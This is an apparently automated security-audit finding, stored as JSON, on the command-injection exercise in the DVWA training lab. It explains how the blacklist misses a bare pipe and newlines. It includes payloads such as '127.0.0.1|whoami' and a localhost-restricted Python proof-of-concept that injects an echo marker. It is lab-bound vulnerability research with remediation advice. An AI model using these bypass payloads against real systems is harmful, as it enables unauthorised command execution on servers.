@@ -1,0 +1,147 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "CMD-003",
+  "input_version": "v2",
+  "prompt_version": "v1",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "CMD-003"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "第4行直接读取 $_REQUEST['ip']，第6-18行黑名单未覆盖单个 '|' 与换行，第22/26行将输入直接拼接进 shell_exec；输入、过滤缺口、危险操作与回显点静态链路完整，仅缺运行验证与部署条件确认。"
+  },
+  "findings": [
+    {
+      "finding_id": "CMD-003-F1",
+      "vulnerability_type": "命令注入",
+      "locations": [
+        {
+          "fragment_id": "CMD-003",
+          "line_start": 4,
+          "line_end": 4,
+          "quote": "$target = trim($_REQUEST[ 'ip' ]);"
+        },
+        {
+          "fragment_id": "CMD-003",
+          "line_start": 6,
+          "line_end": 16,
+          "quote": "'| ' => '',"
+        },
+        {
+          "fragment_id": "CMD-003",
+          "line_start": 17,
+          "line_end": 18,
+          "quote": "$target = str_replace( array_keys( $substitutions ), $substitutions, $target );"
+        },
+        {
+          "fragment_id": "CMD-003",
+          "line_start": 22,
+          "line_end": 22,
+          "quote": "$cmd = shell_exec( 'ping  ' . $target );"
+        },
+        {
+          "fragment_id": "CMD-003",
+          "line_start": 26,
+          "line_end": 26,
+          "quote": "$cmd = shell_exec( 'ping  -c 4 ' . $target );"
+        },
+        {
+          "fragment_id": "CMD-003",
+          "line_start": 29,
+          "line_end": 29,
+          "quote": "$html .= \"<pre>{$cmd}</pre>\";"
+        }
+      ],
+      "data_flow": [
+        "入口：仅当 POST 中存在 Submit 时进入分支（第2行），但 $target 由 $_REQUEST['ip'] 读取（第4行），因此 GET 查询串或 Cookie 中的同名 ip 也能到达同一路径，不限于 POST body。",
+        "处理：trim 只去掉首尾空白，不规范化内部换行、制表符或管道符。",
+        "过滤：第6-16行黑名单仅含 '||'、'&'、';'、'| '（管道加一个空格）、'-'、'$'、'('、')'、'`'，第18行用 str_replace 按数组顺序做单次字面替换。",
+        "缺口：单个 '|' 后不接空格（如 127.0.0.1|id）不匹配 '| '，换行符与制表符也不在名单内，故均原样保留在 $target 中。",
+        "危险操作：第22行（Windows）或第26行（*nix）把 $target 直接拼入 shell_exec('ping ... ' . $target)，交由 cmd.exe 或 /bin/sh -c 解释；管道后内容被当作第二条命令执行，且未使用 escapeshellarg()/escapeshellcmd()。",
+        "回显：第29行把命令 stdout 原样放入 $html，外围处理器再插入 page['body'] 并由 dvwaHtmlEcho 输出，可在响应中观察注入命令输出。"
+      ],
+      "principle": "黑名单采用单次、顺序的字面替换，覆盖的是具体字符串片段而非 shell 元字符语法。管道符本身未被过滤，只过滤了 '| '（管道后一个空格），因此 '127.0.0.1|whoami' 这类不带空格的管道可完整保留；换行符亦未处理，在 sh -c 下等价于命令分隔。最终输入未经 shell 转义直接拼接到 shell_exec 的 ping 命令，形成命令注入。",
+      "impact": "能够访问该页面的已认证用户（若靶场关闭认证则为任意可达用户）可在 Web 服务账户权限下执行任意操作系统命令，读取/篡改应用文件与配置、探测内网、建立进一步利用链。教学验证中仅回显固定标记，不执行破坏性命令。",
+      "preconditions": [
+        "外层处理器确实包含本片段并把 $html 写入 page['body']，且页面可由审计者访问。",
+        "当前难度/配置包含该低难度实现（其他难度若改用白名单或 escapeshellarg 则不适用）。",
+        "请求需带 Submit 参数并处于有效登录会话（若认证开启），或目标未启用认证。",
+        "PHP 未禁用 shell_exec，且目标 OS 存在 ping 可执行文件；php_uname('s') 决定走第22行还是第26行。",
+        "请求链路上没有额外 WAF/代理剥离 '|' 或换行（该条件未在包内提供，需实测确认）。"
+      ],
+      "counterexamples": [
+        "若外层处理器在包含前对 ip 做严格 IP 格式校验、或在第4行之后重新赋值 $target，则本片段内的注入路径不成立。",
+        "若当前难度加载的是 high/medium 的 exec 源码（使用白名单或 escapeshellarg），本文件的代码不会执行。",
+        "若 shell_exec 被 disable_functions 禁用或 ping 不存在，命令不会被 shell 执行，最多得到空输出/报错。",
+        "若前置代理或 PHP 输入层删除 '|' 与换行，仅保留字母数字和点，则管道/换行注入被阻断。",
+        "若页面仅接受 POST 且 $_REQUEST 被上层重写为仅 POST，则 GET/Cookie 通道不存在，但 POST body 注入仍然成立。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n# Local-lab-only draft POC for CMD-003 (command injection).\n# NOT EXECUTED. Requires a valid DVWA session supplied by the operator.\nimport argparse\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nALLOWED_HOSTS = {\"localhost\", \"127.0.0.1\", \"::1\"}\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        return None\n\n\ndef load_cookie(path):\n    if not path:\n        return None\n    try:\n        with open(path, \"r\", encoding=\"utf-8\") as fh:\n            cookie = fh.read().strip()\n    except OSError as exc:\n        sys.exit(\"cannot read cookie file: %s\" % exc)\n    if not cookie or \"\\n\" in cookie or \"\\r\" in cookie:\n        sys.exit(\"cookie file must contain one header value on one line\")\n    return cookie\n\n\ndef post(opener, url, form, cookie, timeout):\n    data = urllib.parse.urlencode(form).encode(\"utf-8\")\n    req = urllib.request.Request(url, data=data, method=\"POST\")\n    req.add_header(\"Content-Type\", \"application/x-www-form-urlencoded\")\n    req.add_header(\"User-Agent\", \"cmd003-local-lab-poc/1.0\")\n    if cookie:\n        req.add_header(\"Cookie\", cookie)\n    try:\n        with opener.open(req, timeout=timeout) as resp:\n            body = resp.read().decode(\"utf-8\", \"replace\")\n            return resp.status, body\n    except urllib.error.HTTPError as exc:\n        sys.exit(\"HTTP error %s (possible auth redirect or missing session); \"\n                 \"verify login/security cookie\" % exc.code)\n    except urllib.error.URLError as exc:\n        sys.exit(\"connection error: %s\" % exc.reason)\n    except TimeoutError:\n        sys.exit(\"request timed out after %.1fs\" % timeout)\n\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"CMD-003 local-only command injection draft\")\n    parser.add_argument(\"--base-url\", required=True,\n                        help=\"http(s)://localhost|127.0.0.1|::1[:port]\")\n    parser.add_argument(\"--path\", default=\"/vulnerabilities/exec/\",\n                        help=\"absolute path of the vulnerable page\")\n    parser.add_argument(\"--cookie-file\",\n                        help=\"local file holding one Cookie header value (never commit)\")\n    parser.add_argument(\"--marker\", default=\"CMDINJ_MARKER_7f3a\")\n    parser.add_argument(\"--timeout\", type=float, default=10.0)\n    args = parser.parse_args()\n\n    parts = urllib.parse.urlsplit(args.base_url)\n    if parts.scheme not in (\"http\", \"https\") or (parts.hostname or \"\").lower() not in ALLOWED_HOSTS:\n        sys.exit(\"refusing: --base-url must be http(s) on localhost, 127.0.0.1 or ::1\")\n    if not args.path.startswith(\"/\") or \"://\" in args.path:\n        sys.exit(\"refusing: --path must be an absolute path on the local target\")\n    url = args.base_url.rstrip(\"/\") + args.path\n\n    cookie = load_cookie(args.cookie_file)\n    opener = urllib.request.build_opener(NoRedirect())\n\n    # Control request: plain loopback IP, no shell metacharacters.\n    status, body = post(opener, url, {\"Submit\": \"Submit\", \"ip\": \"127.0.0.1\"},\n                        cookie, args.timeout)\n    if args.marker in body:\n        sys.exit(\"control response unexpectedly contains marker; abort\")\n    print(\"control: HTTP %s, %d bytes, marker absent\" % (status, len(body)))\n\n    # Test request: '|' is not filtered (blacklist only removes '| ' with a space).\n    payload = \"127.0.0.1|echo \" + args.marker\n    status, body = post(opener, url, {\"Submit\": \"Submit\", \"ip\": payload},\n                        cookie, args.timeout)\n    reflected_payload = payload in body\n    marker_seen = args.marker in body\n    print(\"test: HTTP %s, %d bytes, marker_seen=%s, raw_payload_reflected=%s\"\n          % (status, len(body), marker_seen, reflected_payload))\n    if not marker_seen:\n        sys.exit(\"no marker in response; injection not observed under these conditions\")\n    if reflected_payload:\n        sys.exit(\"payload reflected verbatim; cannot distinguish reflection from execution\")\n    print(\"observed: marker present in command output block; manual re-check with a \"\n          \"second unique marker and compare against the control response\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+，仅使用标准库（argparse、urllib、sys）",
+          "本地授权的 DVWA/教学靶场实例与可用 ping、shell_exec",
+          "有效的登录会话 Cookie（PHPSESSID，及需要时的 security 难度 Cookie）"
+        ],
+        "parameters": [
+          "--base-url：本地基址，如 http://127.0.0.1:8080，仅允许 localhost/127.0.0.1/::1",
+          "--path：漏洞页面绝对路径，默认 /vulnerabilities/exec/",
+          "--cookie-file：保存单行 Cookie 头值的本地文件，不纳入版本库",
+          "--marker：回显标记，默认 CMDINJ_MARKER_7f3a",
+          "--timeout：请求超时秒数，默认 10"
+        ],
+        "steps": [
+          "确认靶场已按低难度部署本片段，PHP 未禁用 shell_exec 且 ping 可用。",
+          "在浏览器完成登录，把 PHPSESSID 与 security 的 Cookie 头值写入仅本地保存的文件（如 ./session.cookie）。",
+          "执行 python3 cmd003_poc.py --base-url http://127.0.0.1:8080 --cookie-file ./session.cookie。",
+          "核对输出：control 行为 HTTP 200 且 marker absent；test 行为 HTTP 200、marker_seen=True、raw_payload_reflected=False。",
+          "用第二个唯一标记重复一次，并保存命令、完整响应、时间与环境到工作包4证据目录。"
+        ],
+        "expected_observation": "control 请求的响应 <pre> 区块仅含 ping 正常输出、不含标记；test 请求的响应 <pre> 区块在 ping 输出之后出现 CMDINJ_MARKER_7f3a，且原始 payload 字符串未被原样反射。",
+        "success_criteria": "同一会话、同一路径下，control 响应不含标记，test 响应 HTTP 200 且命令输出区出现标记，并且 payload 未原样出现在响应中；换第二个唯一标记可重复出现，才可说明 echo 经 shell 执行。HTTP 200 或页面含输入字符串本身不构成成功。",
+        "limitations": [
+          "未运行：本草案未对任何目标发起请求，不能声称已观察到命令执行。",
+          "需人工适配：会话 Cookie、实际路径、端口与难度开关必须由验证人员按部署填写。",
+          "仅验证固定标记回显，不验证任意命令、权限提升或数据读取。",
+          "脚本拒绝跟随重定向，登录失效时会得到 HTTPError 而非自动登录。",
+          "若页面存在将 ip 原样回显的逻辑，marker_seen 不能单独证明执行；脚本用 raw_payload_reflected 做初步排除，仍建议人工核对响应上下文。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "外层请求处理器与 dvwaPage.inc.php 源码未提供（仅文字描述），无法核实是否在包含前再次校验 ip、是否强制 CSRF token、是否记录日志。",
+    "实际部署的 PHP 版本、shell_exec 配置（disable_functions）、Web 服务器与操作系统版本未知。",
+    "认证开关、DVWA 难度配置、会话与 token 的具体要求未知。",
+    "ping 可执行文件与 shell 类型（cmd.exe、/bin/sh、dash、bash）未实测，Windows 与 *nix 两条分支的可利用语法需分别确认。",
+    "仓库原始标签与运行证据不在本次输入内，本结论仅为静态候选。"
+  ],
+  "risk_notes": [
+    "第29行未对命令输出做 HTML 转义即拼入 $html，若注入命令输出含 HTML/JS，可能形成反射型 XSS；本包关注命令注入，未单列 finding。",
+    "$_REQUEST 同时接受 GET/Cookie 同名 ip，若外围仅按 POST 做审计或限流，会遗漏其他输入通道。",
+    "该注入点可被用于内网主机/端口探测或执行任意命令，超出授权教学靶场范围时应立即停止。",
+    "黑名单对 '-' 的过滤会破坏合法 ping 参数，但对安全无实质帮助，反而显示防护思路不可靠。"
+  ],
+  "quality_notes": [
+    "使用黑名单 + str_replace 做命令防护，覆盖不全且顺序替换易被组合绕过，应改为严格 IP 白名单校验，或至少 escapeshellarg() 并对整个参数加引号。",
+    "使用 $_REQUEST 而非 $_POST 读取 ip，输入来源不明确，建议显式指定来源。",
+    "shell_exec 的返回值直接输出且未做 HTML 转义，建议 htmlspecialchars 后输出。",
+    "$html 在第29行直接追加，若未在外围初始化可能产生未定义变量告警（取决于外围赋值）。"
+  ],
+  "limitations": [
+    "仅静态审阅所提供的单个代码块及其文字描述，未读取其他仓库文件，也未运行任何请求。",
+    "行号为标准化代码块内 1 起始局部行号，不对应 prompt 文件行号。",
+    "绕过语法基于 sh/cmd 的管道与换行解析推断，未在本环境实测；实际 shell 可能影响结果。",
+    "无法确认认证、难度、token 与 WAF 等前置条件，候选保持待验证。",
+    "排除性结论仅针对已提供片段，不宣称整个项目安全。"
+  ],
+  "runtime_evidence": []
+}
